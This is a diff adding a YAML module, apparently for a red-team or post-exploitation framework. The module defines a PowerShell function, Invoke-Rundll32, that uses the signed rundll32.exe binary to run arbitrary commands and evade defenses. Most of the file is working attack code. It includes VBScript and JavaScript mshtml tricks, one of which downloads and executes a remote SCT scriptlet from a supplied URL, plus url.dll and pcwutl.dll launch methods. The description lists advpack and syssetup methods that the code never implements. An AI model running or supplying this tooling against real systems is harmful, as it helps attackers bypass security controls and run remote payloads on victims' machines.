@@ -1,0 +1,94 @@
+name: Invoke-Rundll32
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Executes commands via rundll32.exe proxy execution using various
+  DLL functions. Supports multiple methods including advpack.dll
+  LaunchINFSection, syssetup.dll SetupInfObjectInstallAction,
+  javascript and vbscript execution via mshtml, and URL.dll
+  FileProtocolHandler. Rundll32 is a signed Microsoft binary
+  commonly abused for defense evasion.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.011]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: >-
+      Rundll32 execution method to use.
+    required: false
+    value: 'vbscript'
+    suggested_values:
+      - vbscript
+      - javascript
+      - url
+      - pcwutl
+  - name: Command
+    description: Command or executable to run.
+    required: false
+    value: 'calc.exe'
+  - name: ScriptUrl
+    description: >-
+      URL to remote SCT file (used with javascript method).
+    required: false
+    value: ''
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-Rundll32 {
+      param(
+          [string]$Method = "vbscript",
+          [string]$Command = "calc.exe",
+          [string]$ScriptUrl
+      )
+
+      switch ($Method.ToLower()) {
+          "vbscript" {
+              $cmdLine = "rundll32.exe vbscript:`"\..\mshtml,RunHTMLApplication `"+String(CreateObject(`"WScript.Shell`").Run(`"$Command`"),0)"
+              Write-Output "[*] Executing via VBScript method..."
+              cmd /c $cmdLine 2>&1
+              Write-Output "[+] Executed: rundll32 vbscript method with command: $Command"
+          }
+          "javascript" {
+              if (-not $ScriptUrl) {
+                  Write-Output "[-] ScriptUrl is required for javascript method."
+                  return
+              }
+              $cmdLine = "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:$ScriptUrl`").Exec();window.close();"
+              Write-Output "[*] Executing via JavaScript method..."
+              cmd /c $cmdLine 2>&1
+              Write-Output "[+] Executed: rundll32 javascript method with URL: $ScriptUrl"
+          }
+          "url" {
+              Write-Output "[*] Executing via URL.dll FileProtocolHandler..."
+              $result = rundll32.exe url.dll,FileProtocolHandler $Command 2>&1
+              Write-Output "[+] Executed: rundll32.exe url.dll,FileProtocolHandler $Command"
+              if ($result) { Write-Output $result }
+          }
+          "pcwutl" {
+              Write-Output "[*] Executing via pcwutl.dll LaunchApplication..."
+              $result = rundll32.exe pcwutl.dll,LaunchApplication $Command 2>&1
+              Write-Output "[+] Executed: rundll32.exe pcwutl.dll,LaunchApplication $Command"
+              if ($result) { Write-Output $result }
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method."
+          }
+      }
+  }
+script_end: Invoke-Rundll32 -Method "{{ Method }}" -Command "{{ Command }}" -ScriptUrl
+  "{{ ScriptUrl }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
